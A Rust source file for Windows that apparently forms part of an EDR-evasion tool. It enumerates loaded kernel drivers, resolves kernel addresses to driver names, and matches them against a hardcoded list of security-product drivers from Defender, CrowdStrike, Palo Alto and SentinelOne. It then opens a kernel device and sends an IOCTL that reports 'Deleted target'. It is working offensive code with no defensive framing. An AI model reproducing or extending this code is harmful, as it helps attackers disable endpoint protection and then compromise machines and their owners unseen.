use std::ffi::{CStr, c_void, CString, OsString};
use std::os::windows::ffi::OsStringExt;
use std::ptr::{null, null_mut};

use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::psapi::{EnumDeviceDrivers, GetDeviceDriverBaseNameW};
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE,
};




/// Get the base address of a loaded driver (e.g., "ntoskrnl.exe" or "fltmgr.sys")
pub fn get_driver_base(drv_name: &str) -> Option<LPVOID> {
    unsafe {
        let mut drivers: Vec<LPVOID> = Vec::with_capacity(1024);
        let mut cb_needed: DWORD = 0;

        if EnumDeviceDrivers(
            drivers.as_mut_ptr(),
            (drivers.capacity() * std::mem::size_of::<LPVOID>()) as DWORD,
            &mut cb_needed,
        ) == 0
        {
            eprintln!("[!] EnumDeviceDrivers failed with error {}", GetLastError());
            return None;
        }

        let count = cb_needed as usize / std::mem::size_of::<LPVOID>();
        drivers.set_len(count);

        for &driver in &drivers {
            let mut name_buf: [u16; 260] = [0; 260];
            let len = GetDeviceDriverBaseNameW(
                driver as *mut _,
                name_buf.as_mut_ptr(),
                name_buf.len() as DWORD,
            );

            if len > 0 {
                let name = OsString::from_wide(&name_buf[..len as usize])
                    .to_string_lossy()
                    .into_owned();

                if name.eq_ignore_ascii_case(drv_name) {
                    return Some(driver);
                }
            }
        }
    }

    None
}

/// Find the driver name given a kernel address.
/// If the address belongs inside a driver/module, returns its name.
pub fn find_driver_name_from_addr(address: u64) -> Option<String> {
    unsafe {
        const MAX_DRIVERS: usize = 1024;
        let mut drivers: Vec<LPVOID> = vec![std::ptr::null_mut(); MAX_DRIVERS];
        let mut cb_needed: DWORD = 0;

        if EnumDeviceDrivers(
            drivers.as_mut_ptr(),
            (drivers.len() * std::mem::size_of::<LPVOID>()) as DWORD,
            &mut cb_needed,
        ) == 0
        {
            eprintln!(
                "[!] Could not resolve driver for 0x{:x}, an EDR driver might be missed",
                address
            );
            return None;
        }

        let count = cb_needed as usize / std::mem::size_of::<LPVOID>();
        drivers.truncate(count);

        let mut min_diff: u64 = u64::MAX;

        for &driver in &drivers {
            let base = driver as u64;
            if base <= address {
                let diff = address - base;
                if diff < min_diff {
                    min_diff = diff;
                }
            }
        }

        if min_diff == u64::MAX {
            eprintln!(
                "[!] Could not resolve driver for 0x{:x}, an EDR driver might be missed",
                address
            );
            return None;
        }

        // Recover base from the "best match"
        let base_addr = (address - min_diff) as LPVOID;

        let mut name_buf: [u16; 260] = [0; 260];
        let len = GetDeviceDriverBaseNameW(base_addr, name_buf.as_mut_ptr(), name_buf.len() as DWORD);

        if len == 0 {
            eprintln!(
                "[!] Could not resolve driver for 0x{:x}, an EDR driver might be missed",
                address
            );
            return None;
        }

        let os_str = OsString::from_wide(&name_buf[..len as usize]);
        Some(os_str.to_string_lossy().into_owned())
    }
}


/// Check if the provided driver name matches a known EDR driver.
pub fn is_driver_name_matching_edr(driver: &str) -> bool {
    // Known EDR driver list (to be expanded as needed)
    const EDR_DRIVERS: &[&str] = &[
        // Windows Defender, MDE, etc.
        "WdFilter.sys",
        "WdBoot.sys",
        "MpKslDrv.sys",
        "mpFilter.sys",
        "SysmonDrv.sys",
        // CrowdStrike
        "csagent.sys",
        "CSDeviceControl.sys",
        "CSFirmwareAnalysis.sys",
        "cspcm4.sys",
        "Osfm-00000446.bin",
        // Palo Alto Networks: Cortex EDR, Traps, etc.
        "cyverak.sys",
        "cyvrlpc.sys",
        "cyvrmtgn.sys",
        "tdevflt.sys",
        "cyvrfsfd.sys",
        "tedrdrv.sys",
        "tedrpers",
        // SentinelOne
        "SentinelMonitor.sys",
        "SentinelDeviceControl.sys",
        "SentinelOne.sys",
    ];

    // Compare case-insensitive
    for &edr_driver in EDR_DRIVERS {
        if driver.eq_ignore_ascii_case(edr_driver) {
            return true;
        }
    }

    false
}


pub fn get_driver_handle() {
    let mut dw_return_val: u32 = 0;
    let mut dw_bytes_returned: u32 = 0;

    let cstr_device_name =
        CString::new("\\\\.\\GLOBALROOT\\Device\\OBJINFO").expect("CString conversion failed");

    unsafe {
        let h_device = CreateFileA(
            cstr_device_name.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if h_device.is_null() || h_device == INVALID_HANDLE_VALUE {
            eprintln!(
                "Failed to open handle to device. Error code: {}",
                GetLastError()
            );
            return;
        }

        println!("[+] Opened handle to device");

        let b_res = DeviceIoControl(
            h_device,
            0x8016E000,
            null_mut(),
            0,
            &mut dw_return_val as *mut _ as *mut _,
            std::mem::size_of::<u32>() as u32,
            &mut dw_bytes_returned,
            null_mut(),
        );

        if b_res == 0 || dw_return_val == 0 {
            println!("[-] Delete failed");
            CloseHandle(h_device);
            eprintln!("[-] Error code: {}", GetLastError());
        } else {
            println!("[!] Deleted target");
        }

        CloseHandle(h_device);
    }
}

